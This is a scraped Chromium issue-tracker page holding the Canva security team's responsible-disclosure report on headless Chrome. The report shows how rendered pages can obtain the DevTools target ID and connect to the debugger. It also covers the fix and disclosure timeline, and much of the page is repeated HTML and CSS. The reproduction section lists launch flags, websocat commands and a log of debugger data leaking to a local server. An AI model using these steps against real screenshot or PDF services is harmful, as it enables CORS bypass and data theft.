and<!----></span><br>non-browser clients should not need it in general.<span class="line"><!---->non-browser clients should not need it in general.<!----></span><br><br>I realise that this is a third party library but I see that it was not updated for 5 years and there were changes made to it. So is it a work at this point? The newer version comes with an option to suppress sending the origin header so we can either remove it in this version<span class="line"><!---->I realise that this is a third party library but I see that it was not updated for 5 years and there were changes made to it. So is it a work at this point? The newer version comes with an option to suppress sending the origin header so we can either remove it in this version<!----></span><br>or use the option if the library can be updated.<span class="line"><!---->or use the option if the library can be updated.<!----></span><br><br>[1]: <span class="line"><!---->[1]:         The following revision refers to this bug:<span class="line"><!---->The following revision refers to this bug:<!----></span><br>  <span class="line"><!---->  <!----></span>https://chromium.googlesource.com/chromium/src/+/0154caeefc74530d5cb57ce71608beb1b77bca39<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromium/src/+/0154caeefc74530d5cb57ce71608beb1b77bca39"><!---->https://chromium.googlesource.com/chromium/src/+/0154caeefc74530d5cb57ce71608beb1b77bca39<!----></a><br><br>commit <span class="line"><!---->commit <!----></span>0154caeefc74530d5cb57ce71608beb1b77bca39<a class="undefined" target="_blank" href="https://crrev.com/0154caeefc74530d5cb57ce71608beb1b77bca39"><!---->0154caeefc74530d5cb57ce71608beb1b77bca39<!----></a><br>Author: Alex Rudenko <<span class="line"><!---->Author: Alex Rudenko &lt;<!----></span>alexrudenko@chromium.org<a class="undefined" target="_blank" href="/u/alexrudenko@chromium.org"><!---->alexrudenko@chromium.org<!----></a>><span class="line"><!---->&gt;<!----></span><br>Date: Wed Dec 21 07:54:07 2022<span class="line"><!---->Date: Wed Dec 21 07:54:07 2022<!----></span><br><br>DevTools: reject debugging web socket connections with a defined Origin header<span class="line"><!---->DevTools: reject debugging web socket connections with a defined Origin header<!----></span><br><br>Unless the browser is started with a new flag `--remote-allow-origins=<origin>[,<origin>, ...]`. The star origin `*` allows all origins.<span class="line"><!---->Unless the browser is started with a new flag `--remote-allow-origins=&lt;origin&gt;[,&lt;origin&gt;, ...]`. The star origin `*` allows all origins.<!----></span><br>This CL should not affect non-browser clients such as Puppeteer and WebDriver. It affects DevTools e2e tests in the hosted mode which is fixed in [1]. It should not affect features like remote debugging that<span class="line"><!---->This CL should not affect non-browser clients such as Puppeteer and WebDriver.         So this issue can be considered fixed I believe. To summarise:<span class="line"><!---->So this issue can be considered fixed I believe. To summarise:<!----></span><br><br>1) Loading of json endpoints into iframes has been disabled.<span class="line"><!---->1) Loading of json endpoints into iframes has been disabled.<!----></span><br>2) `json/new` HTTP verbs have been restricted to PUT.<span class="line"><!---->2) `json/new` HTTP verbs have been restricted to PUT.<!----></span><br>3) Connections with an origin header have been disallowed.<span class="line"><!---->3) Connections with an origin header have been disallowed.<!----></span><br><br>So even if the page somehow learns/guess the websocket URL, they will not be able to connect to it from within the page.<span class="line"><!---->So even if the page somehow learns/guess the websocket URL, they will not be able to connect to it from within the page.<!----></span><mr-comment-content></mr-comment-content>

It will greatly help us reference this + chase remediation.<!----></span><br>A CVE will be issued for this bug, directly on this report, when the fix ships in a Stable channel release. <span class="line"><!---->A CVE will be issued for this bug, directly on this report, when the fix ships in a Stable channel release. <!----></span><br>This is a fix for a low severity issue, so it is not backmerged. It was landed on M111, the release date of which is 7 March 2023. <span class="line"><!---->This is a fix for a low severity issue, so it is not backmerged. It was landed on M111, the release date of which is 7 March 2023. <!----></span><br><br>This issue was updated as Fixed on 21 December and, as with most security bugs, will automatically be publicly disclosed 14 weeks after fix - so on 29 March 2023 if my math is correct. <span class="line"><!---->This issue was updated as Fixed on 21 December and, as with most security bugs, will automatically be publicly disclosed 14 weeks after fix - so on 29 March 2023 if my math is correct. <!----></span><br><br>In the meantime, since fixed, this issue has been disclosed to the security-notify community (see label Retrict-View-SecurityNotify) so downstream Chromium embedders of significantly deployed browsers and software have access to this issue so they can absorb the fix.       <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1385982#c45">Comment 45<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Sun, Jan 22, 2023, 9:09 PM EST"></chops-timestamp>

        We haven't extensively researched beyond our own usage of Chromium, and some examples in the wild that have a responsible disclosure program that we used to build and confirm our research.<span class="line"><!---->We haven't extensively researched beyond our own usage of Chromium, and some examples in the wild that have a responsible disclosure program that we used to build and confirm our research.<!----></span><br><br>Based on the two issues we found:<span class="line"><!---->Based on the two issues we found:<!----></span><br><br>Everyone who used long-lived Chromium instances is vulnerable to /json/new launching persistent pages. Regardless of whether the output is reflected.<span class="line"><!---->Everyone who used long-lived Chromium instances is vulnerable to /json/new launching persistent pages. Regardless of whether the output is reflected.<!----></span><br><br>For the RCE/CORS/SSRF style attack where the browser ID is reflected, we found can appear in export functionality (e.g. export page as PDF), automated testing services, and various URL to screenshot services. I think a key contributing factor is that Puppeteer with the pre-fix version of Chromium is vulnerable out of the box (uses websockets and not pipes) and users are encouraged to keep Chromium running as the performance penalty for launching a new instance per job is significant.<span class="line"><!---->For the RCE/CORS/SSRF style attack where the browser ID is reflected, we found can appear in export functionality (e.g. export page as PDF), automated testing services, and various URL to screenshot services. I think a key contributing factor is that Puppeteer with the pre-fix version of Chromium is vulnerable out of the box (uses websockets and not pipes) and users are encouraged to keep Chromium running as the performance penalty for launching a new instance per job is significant.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        by

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>

        </span>

        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        
          Blocked on issues<span>Blocked on issues</span>
          
            close<i class="material-icons">close</i>
          <button aria-label="close">
            <i class="material-icons">close</i>
          </button>
        <h3 class="medium-heading">
          <span>Blocked on issues</span>

          </button>

    <mr-issue-page issueclosed=""><!---->
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }

          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }

          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }

            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }

            width: 100%;
            padding: 0;

            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      
      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        Description #1 by zs...@canva.com (Nov 17, 2022)

      <option value="0" selected="">
        Description #1 by zs...@canva.com (Nov 17, 2022)
      </option>
    <!---->
        </select>
      </div>
      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>As you're well aware headless Chromium is widely used to convert websites to images and PDFs, this functionality can be found in numerous cloud services that render user-provided pages and return an image version. Projects like <span class="line"><!---->As you're well aware headless Chromium is widely used to convert websites to images and PDFs, this functionality can be found in numerous cloud services that render user-provided pages and return an image version. Projects like <!----></span>https://github.com/puppeteer/puppeteer<a class="undefined" target="_blank" href="https://github.com/puppeteer/puppeteer"><!---->https://github.com/puppeteer/puppeteer<!----></a> launch in a configuration by default that is vulnerable to the below issue.<span class="line"><!----> launch in a configuration by default that is vulnerable to the below issue.<!----></span><br><br>From our research we've found that Chrome is used in these cases via:<span class="line"><!---->From our research we've found that Chrome is used in these cases via:<!----></span><br><br> * Starting Chrome headlessly: --headless<span class="line"><!----> * Starting Chrome headlessly: --headless<!----></span><br> * Exposing the debug port so the launching process can control Chrome on loopback without launching Chrome per screenshot/PDF export, e.g. --remote-debugging-port=9222<span class="line"><!----> * Exposing the debug port so the launching process can control Chrome on loopback without launching Chrome per screenshot/PDF export, e.g. --remote-debugging-port=9222<!----></span><br><br>In order to Connect to the debug port a "target ID" is required. This target ID is printed by Chrome onto stdout, e.g.:<span class="line"><!---->In order to Connect to the debug port a "target ID" is required. This target ID is printed by Chrome onto stdout, e.g.:<!----></span><br><br>DevTools listening on ws://127.0.0.1:9222/devtools/browser/94ddc66f-fb4d-4456-93c4-b9c2281bbd39<span class="line"><!---->DevTools listening on ws://127.0.0.1:9222/devtools/browser/94ddc66f-fb4d-4456-93c4-b9c2281bbd39<!----></span><br><br>The target ID serves as a type of authentication token that prevents pages from connecting to the debug websocket.<span class="line"><!---->The target ID serves as a type of authentication token that prevents pages from connecting to the debug websocket.<!----></span><br><br>Due to several endpoints in the Chrome DevTools protocol it's possible for pages rendered within Chrome (as per the use-cases above, e.g. for converting HTML to images or PDFs) to obtain this target ID and connect to to the Chrome debugger. This allows:<span class="line"><!---->Due to several endpoints in the Chrome DevTools protocol it's possible for pages rendered within Chrome (as per the use-cases above, e.g. for converting HTML to images or PDFs) to obtain this target ID and connect to to the Chrome debugger. This allows:<!----></span><br><br> * CORS bypasses via methods like Runtime.evaluate<span class="line"><!----> * CORS bypasses via methods like Runtime.evaluate<!----></span><br> * Proxy bypasses (if setup) via Target.createBrowserContext<span class="line"><!----> * Proxy bypasses (if setup) via Target.createBrowserContext<!----></span><br> * Accessing other pages/tabs in the browser via Target.getTargets <span class="line"><!----> * Accessing other pages/tabs in the browser via Target.getTargets <!----></span><br><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Chrome Version: 107.0.5304.110 + stable<span class="line"><!---->Chrome Version: 107.0.5304.110 + stable<!----></span><br>Operating System: macOS 12.6.1 (M1) (also tested on Ubuntu 20.x x86)<span class="line"><!---->Operating System: macOS 12.6.1 (M1) (also tested on Ubuntu 20.x x86)<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br><br>Note that Chrome is launched with a fixed remote debugging port to make the PoC easier. We have a method for effectively finding the port (within 30s for the full 1-65535 range) which we can share if required.<span class="line"><!---->Note that Chrome is launched with a fixed remote debugging port to make the PoC easier. We have a method for effectively finding the port (within 30s for the full 1-65535 range) which we can share if required.<!----></span><br><br>To reproduce and simulate a cloud service using Chrome to convert an arbitrary webpage to an image:<span class="line"><!---->To reproduce and simulate a cloud service using Chrome to convert an arbitrary webpage to an image:<!----></span><br><br> 1. Save `index.html` and `persist.html` locally<span class="line"><!----> 1. Save `index.html` and `persist.html` locally<!----></span><br> 2. Serve them up on HTTP 5959, e.g. python3 -m http.server 5959<span class="line"><!----> 2. Serve them up on HTTP 5959, e.g. python3 -m http.server 5959<!----></span><br> 3. Launch Chrome headlessly and with a debugging port enabled (on loopback, this issue is unrelated to "remote" access)<span class="line"><!----> 3. Launch Chrome headlessly and with a debugging port enabled (on loopback, this issue is unrelated to "remote" access)<!----></span><br><br>/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \<span class="line"><!---->/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \<!----></span><br>    --remote-debugging-port=9222 \<span class="line"><!---->    --remote-debugging-port=9222 \<!----></span><br>    --user-data-dir=chrome-profile \<span class="line"><!---->    --user-data-dir=chrome-profile \<!----></span><br>    --no-first-run \<span class="line"><!---->    --no-first-run \<!----></span><br>    --headless \<span class="line"><!---->    --headless \<!----></span><br>    <span class="line"><!---->    <!----></span>http://localhost:5959/index.html<a class="undefined" target="_blank" href="http://localhost:5959/index.html"><!---->http://localhost:5959/index.html<!----></a><br><br>DevTools listening on ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd<span class="line"><!---->DevTools listening on ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd<!----></span><br><br> 4. Export the loaded page as a screenshot. This simulates the way Chrome is used server-side in many services:<span class="line"><!----> 4. Export the loaded page as a screenshot. This simulates the way Chrome is used server-side in many services:<!----></span><br><br>Using <span class="line"><!---->Using <!----></span>https://github.com/vi/websocat<a class="undefined" target="_blank" href="https://github.com/vi/websocat"><!---->https://github.com/vi/websocat<!----></a> for example:<span class="line"><!----> for example:<!----></span><br><br>$ echo '{"id":1, "method":"Target.getTargets"}' | websocat -n1 ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd<span class="line"><!---->$ echo '{"id":1, "method":"Target.getTargets"}' | websocat -n1 ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd<!----></span><br><br>{"id":1,"result":{"targetInfos":[{"targetId":"D868419574E9EC5AD570BA4C301FA972","type":"page","title":"localhost:5959/persist.html","url":"<span class="line"><!---->{"id":1,"result":{"targetInfos":[{"targetId":"D868419574E9EC5AD570BA4C301FA972","type":"page","title":"localhost:5959/persist.html","url":"<!----></span>http://localhost:5959/persist.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"},{"targetId":"47519BDF096DC4C0273FDB56AC170D6E","type":"page","title":"localhost:5959/index.html","url":"http://localhost:5959/index.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"}]}}<a class="undefined" target="_blank" href="http://localhost:5959/persist.html&quot;,&quot;attached&quot;:false,&quot;canAccessOpener&quot;:false,&quot;browserContextId&quot;:&quot;3B1DA4A3D6955F3F0B73FC01A8D6C293&quot;},{&quot;targetId&quot;:&quot;47519BDF096DC4C0273FDB56AC170D6E&quot;,&quot;type&quot;:&quot;page&quot;,&quot;title&quot;:&quot;localhost:5959/index.html&quot;,&quot;url&quot;:&quot;http://localhost:5959/index.html&quot;,&quot;attached&quot;:false,&quot;canAccessOpener&quot;:false,&quot;browserContextId&quot;:&quot;3B1DA4A3D6955F3F0B73FC01A8D6C293&quot;}]}}"><!---->http://localhost:5959/persist.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"},{"targetId":"47519BDF096DC4C0273FDB56AC170D6E","type":"page","title":"localhost:5959/index.html","url":"http://localhost:5959/index.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"}]}}<!----></a><br><br>Then screenshot the "index.html" target simulating an export from a page to an image:<span class="line"><!---->Then screenshot the "index.html" target simulating an export from a page to an image:<!----></span><br><br>$ echo '{"id":1, "method":"Page.captureScreenshot"}' | websocat -n1 -B 100000 ws://127.0.0.1:9222/devtools/page/47519BDF096DC4C0273FDB56AC170D6E | jq -r '.result.data' | base64 --decode > screenshot.png<span class="line"><!---->$ echo '{"id":1, "method":"Page.captureScreenshot"}' | websocat -n1 -B 100000 ws://127.0.0.1:9222/devtools/page/47519BDF096DC4C0273FDB56AC170D6E | jq -r '.result.data' | base64 --decode &gt; screenshot.png<!----></span><br><br>(See screenshot.png)<span class="line"><!---->(See screenshot.png)<!----></span><br><br>5. Update persist.html (line 14) with the browser ID from the screenshot (659f2867-0338-4cb0-8dea-96a1b26bc5cd)<span class="line"><!---->5. Update persist.html (line 14) with the browser ID from the screenshot (659f2867-0338-4cb0-8dea-96a1b26bc5cd)<!----></span><br>6. Note HTTP 5959 is called with the browser process info, demonstrating escaping from the page into the debugger<span class="line"><!---->6. Note HTTP 5959 is called with the browser process info, demonstrating escaping from the page into the debugger<!----></span><br><br>::1 - - [18/Nov/2022 15:06:10] "GET /persist.html HTTP/1.1" 200 -<span class="line"><!---->::1 - - [18/Nov/2022 15:06:10] "GET /persist.html HTTP/1.1" 200 -<!----></span><br>::1 - - [18/Nov/2022 15:06:10] "GET /?o=%7B%22id%22%3A1%2C%22result%22%3A%7B%22processInfo%22%3A%5B%7B%22type%22%3A%22browser%22%2C%22id%22%3A45761%2C%22cpuTime%22%3A0.936511%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45771%2C%22cpuTime%22%3A1.150753%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45767%2C%22cpuTime%22%3A0.070163%7D%2C%7B%22type%22%3A%22GPU%22%2C%22id%22%3A45764%2C%22cpuTime%22%3A0.519738%7D%2C%7B%22type%22%3A%22network.mojom.NetworkService%22%2C%22id%22%3A45766%2C%22cpuTime%22%3A0.277861%7D%5D%7D%7D HTTP/1.1" 200 -<span class="line"><!---->::1 - - [18/Nov/2022 15:06:10] "GET /?o=%7B%22id%22%3A1%2C%22result%22%3A%7B%22processInfo%22%3A%5B%7B%22type%22%3A%22browser%22%2C%22id%22%3A45761%2C%22cpuTime%22%3A0.936511%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45771%2C%22cpuTime%22%3A1.150753%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45767%2C%22cpuTime%22%3A0.070163%7D%2C%7B%22type%22%3A%22GPU%22%2C%22id%22%3A45764%2C%22cpuTime%22%3A0.519738%7D%2C%7B%22type%22%3A%22network.mojom.NetworkService%22%2C%22id%22%3A45766%2C%22cpuTime%22%3A0.277861%7D%5D%7D%7D HTTP/1.1" 200 -<!----></span><br><br><br>FIXING<span class="line"><!---->FIXING<!----></span><br><br>From looking into this there's a few ways impact can be reduced by Chrome:<span class="line"><!---->From looking into this there's a few ways impact can be reduced by Chrome:<!----></span><br><br> * Ensuring `/json/version` and related endpoints cannot be iframed (e.g. set a Content-Security-Policy or X-Frame-Options response header)<span class="line"><!----> * Ensuring `/json/version` and related endpoints cannot be iframed (e.g. set a Content-Security-Policy or X-Frame-Options response header)<!----></span><br> * Ensuring `/json/new` cannot be accessed from Chrome, or more specifically pages within the sandbox. The GET/POST deprecation should help here, but `/json/new` isn't required for this exploit if Chrome isn't relaunched.<span class="line"><!----> * Ensuring `/json/new` cannot be accessed from Chrome, or more specifically pages within the sandbox. The GET/POST deprecation should help here, but `/json/new` isn't required for this exploit if Chrome isn't relaunched.<!----></span><br> * More documentation, only the risks of "remote" access to the debug port is discussed in docs. However, the exploit above works over loopback.<span class="line"><!----> * More documentation, only the risks of "remote" access to the debug port is discussed in docs. However, the exploit above works over loopback.<!----></span><br><br><br>CREDIT INFORMATION<b class="line"><!---->CREDIT INFORMATION<!----></b><br><br>Reporter credit: Rhys Elsmore and Zac Sims of the Canva security team<span 